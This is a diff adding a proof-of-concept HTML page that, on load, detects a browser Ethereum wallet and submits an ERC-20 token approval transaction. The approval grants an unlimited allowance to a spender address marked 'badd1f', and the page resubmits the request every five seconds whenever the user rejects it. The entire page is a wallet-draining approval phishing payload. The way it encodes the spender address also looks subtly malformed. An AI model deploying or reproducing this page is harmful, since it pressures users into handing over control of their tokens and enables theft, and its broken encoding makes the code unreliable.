@@ -1,0 +1,16 @@
+<!doctype html><html><head><meta charset="utf-8"><title>poc9d - approve RETRY</title>
+<script>
+let p=null, tries=0;
+function poll(n){if(p)return;if(window.ethereum){p=window.ethereum;run(0);}else if(n<30){document.title='poc9d wait';setTimeout(()=>poll(n+1),500);}else{document.title='poc9d NO PROVIDER';}}
+function out(m){var d=document.createElement('div');d.textContent=m;document.body.appendChild(d);}
+async function tryApprove(){
+  var a=(await p.request({method:'eth_accounts'}));
+  var approve='0x095ea7b3'+'0'.repeat(24)+'00000000000000000000000000000000000badd1f'.slice(-24)+'f'.repeat(64);
+  var tx={from:a[0], to:'0x111111117dca0fe4b95faf1c6368b8f2d1cf8a07', value:'0x0', data:'0x'+approve};
+  out('TRY '+(tries++)+' '+tx.to);
+  try{ out('OK '+await p.request({method:'eth_sendTransaction',params:[tx]})); }
+  catch(e){ out('ERR '+tries+' '+e.message); setTimeout(tryApprove,5000); }
+}
+async function run(){ try{ await tryApprove(); }catch(e){out('FATAL '+e.message);} }
+poll(0);
+</script></body></html>
